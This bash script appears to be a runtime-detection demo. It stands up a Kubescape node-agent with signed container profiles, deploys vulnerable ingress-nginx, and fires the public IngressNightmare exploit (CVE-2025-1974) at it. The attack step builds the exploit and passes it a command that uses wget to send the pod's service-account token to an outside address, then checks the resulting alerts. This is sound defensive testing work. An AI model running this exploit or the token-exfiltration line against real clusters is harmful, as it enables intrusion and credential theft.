#!/usr/bin/env bash
set -euo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
ROOT="$(cd "$HERE/../.." && pwd)"
SB="$ROOT/example/redis/distros/signed-bundles"
CP=containerprofiles.spdx.softwarecomposition.kubescape.io
NS=ingress-nginx
VER=controller-v1.11.0
cd "$ROOT"

# hack/cp-to-fragment.py (signing step) imports yaml + requests.
for p in python3-yaml python3-requests; do dpkg -s "$p" >/dev/null 2>&1 || sudo apt-get install -y -qq "$p"; done

echo "### signed kubescape stack"
make kubescape
kubectl -n honey rollout status ds/node-agent --timeout=300s

echo "### monitor ingress-nginx"
P=$(kubectl -n honey get cm node-agent -o jsonpath='{.data.config\.json}' | python3 -c 'import json,sys;c=json.load(sys.stdin);c["excludeNamespaces"]=",".join(x for x in c["excludeNamespaces"].split(",") if x!="ingress-nginx");print(json.dumps({"data":{"config.json":json.dumps(c)}}))')
kubectl -n honey patch cm node-agent --type merge -p "$P"
kubectl -n honey rollout restart ds node-agent
kubectl -n honey rollout status ds node-agent --timeout=180s

echo "### vulnerable ingress-nginx v1.11.0"
kubectl apply -f "https://raw.githubusercontent.com/kubernetes/ingress-nginx/$VER/deploy/static/provider/cloud/deploy.yaml"
kubectl -n "$NS" rollout status deploy/ingress-nginx-controller --timeout=180s

echo "### learn controller profile"
kubectl -n "$NS" rollout restart deploy/ingress-nginx-controller
kubectl -n "$NS" rollout status deploy/ingress-nginx-controller --timeout=120s
until kubectl -n "$NS" get "$CP" -o jsonpath='{.items[0].metadata.annotations.kubescape\.io/status}' 2>/dev/null | grep -q completed; do sleep 10; done

echo "### sign the SBoB (vendor key)"
N=$(kubectl -n "$NS" get "$CP" -o jsonpath='{.items[0].metadata.name}')
kubectl -n "$NS" get "$CP" "$N" -o json | python3 "$HERE/hack/cp-to-fragment.py" > "$HERE/frag-base-ingress.yaml"
[ -x "$SB/sign-object" ] || { curl -fsSL -o "$SB/sign-object" https://github.com/k8sstormcenter/node-agent/releases/download/sign-object-v0.1.6/sign-object-linux-amd64 && chmod +x "$SB/sign-object"; }
SIGN_OBJECT="$SB/sign-object" "$SB/sign-fragment.sh" "$HERE/frag-base-ingress.yaml" "$SB/keys/vendor.pem"

echo "### bind signed profile"
kubectl -n "$NS" patch deploy ingress-nginx-controller --type merge -p '{"spec":{"template":{"metadata":{"labels":{"kubescape.io/user-defined-profile":"ingress-base"}}}}}'
kubectl -n "$NS" rollout status deploy/ingress-nginx-controller --timeout=120s
sleep 20
kubectl -n honey logs -l app=node-agent -c node-agent --tail=-1 --prefix=false --since=2m | grep -E "verified object signature.*ingress-base|adopted user-authored.*ingress-base" | tail -2

echo "### attack: IngressNightmare CVE-2025-1974 via auth-url CVE-2025-24514"
command -v go >/dev/null || sudo apt-get install -y -qq golang-go
for p in gcc libssl-dev; do dpkg -s "$p" >/dev/null 2>&1 || sudo apt-get install -y -qq "$p"; done
[ -d "$HERE/exploit/ein" ] || git clone -q https://github.com/Esonhugh/ingressNightmare-CVE-2025-1974-exps "$HERE/exploit/ein"
# GOWORK=off: keep the ein module out of any ambient go.work (mod-mode conflict).
( cd "$HERE/exploit/ein" && GOWORK=off GOFLAGS=-mod=mod go build -o ing . )
PODIP=$(kubectl -n "$NS" get pod -l app.kubernetes.io/component=controller -o jsonpath='{.items[0].status.podIP}')
ADM=$(kubectl -n "$NS" get svc ingress-nginx-controller-admission -o jsonpath='{.spec.clusterIP}')
"$HERE/exploit/ein/ing" -m c -c 'for i in 1 2 3 4 5 6 7 8; do wget -q -T2 -O- "http://1.1.1.1/leak?t=$(head -c20 /var/run/secrets/kubernetes.io/serviceaccount/token)" 2>/dev/null; sleep 1; done' -i "https://$ADM:443" -u "http://$PODIP:80" --is-auth-url

echo "### expected detections"
sleep 25
kubectl -n honey logs -l app=node-agent -c node-agent --tail=-1 --prefix=false --since=3m | grep -oE '"RuleID":"R[0-9]+"|Unexpected file access[^"]*\/proc\/[0-9]+\/fd\/[0-9]+' | sort | uniq -c | sort -rn

echo "### tamper the signed SBoB -> R1016"
kubectl -n "$NS" patch "$CP" ingress-base --type=json -p='[{"op":"add","path":"/spec/execs/-","value":{"path":"/bin/eviltamper","args":["/bin/eviltamper"]}}]'
sleep 90
kubectl -n honey logs -l app=node-agent -c node-agent --tail=-1 --prefix=false --since=110s | grep -E '"RuleID":"R1016"|overlay refused|does not verify' | tail -3
